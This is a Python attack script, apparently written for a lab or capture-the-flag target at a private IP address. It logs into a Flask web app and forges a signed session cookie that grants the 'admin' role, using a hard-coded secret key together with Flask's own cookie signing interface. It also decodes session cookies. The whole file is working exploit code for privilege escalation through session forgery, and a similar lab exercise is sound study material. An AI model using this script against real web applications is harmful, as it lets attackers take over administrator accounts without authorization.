#!/usr/bin/env python

import requests
import sys
import zlib
from itsdangerous import base64_decode
import ast
from flask.sessions import SecureCookieSessionInterface


wanted_cookie = '{"role": "admin" , "user" : "3"}' # Data that we want to sign

url = "http://172.18.0.2:5000"

s = requests.Session() # To keep track of the session's cookie


class MockApp(object):

    def __init__(self, secret_key):
        self.secret_key = secret_key
        

def login(user,password) : 
    '''
    @ user -> the username
    @ password -> the passowrd
    '''
    data = {'email': user ,'password' : password }
    


    
    print ("User : {0}".format(user))
    print ("Password : {0}".format(password))
    send = s.post( url + "/login" ,data = data ) #post to the login page the provided data 



    #print(encode("secret",cookie_cracked))

    if "No Such User" in send.text : 
        print("STATUS : Failed Login")
        print(s)
        
        print('----------------------')
    else : 
        print("STATUS : LOGGED IN ")
        print("Cookie : {0}".format(s.cookies['session']))   #if the user is logged in print his cookie
        print('----------------------')
    return s.cookies['session']
        
def logout ():
    s.get(url + "/logout")        
def encode(secret_key, session_cookie_structure):
        """ Encode a Flask session cookie """
        try:
            app = MockApp(secret_key)
               
            session_cookie_structure = dict(ast.literal_eval(session_cookie_structure)) # Dividing the cookie into three parts to be read
            si = SecureCookieSessionInterface()
            s = si.get_signing_serializer(app)

            return s.dumps(session_cookie_structure)
        except Exception as e:
            return "[Encoding error] {}".format(e)
            raise e
def decode(session_cookie_value, secret_key=None):
        """ Decode a Flask cookie  """
        try:
            if(secret_key==None):
                compressed = False
                payload = session_cookie_value

                if payload.startswith('.'):
                    compressed = True
                    payload = payload[1:]
                                            
                data = payload.split(".")[0] # The first section is the session data

                data = base64_decode(data)
                if compressed:
                    data = zlib.decompress(data)

                return data
            else:
                app = MockApp(secret_key)

                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)

                return s.loads(session_cookie_value)
        except Exception as e:
            return "[Decoding error] {}".format(e)
            raise e
if __name__ == "__main__" : 
    print("Connecting to {0} ...... ".format(url))  
    print(encode("Sup3r_SeKret_T0ken" , wanted_cookie))
    #print("LOGGING OUT ")
    logout()
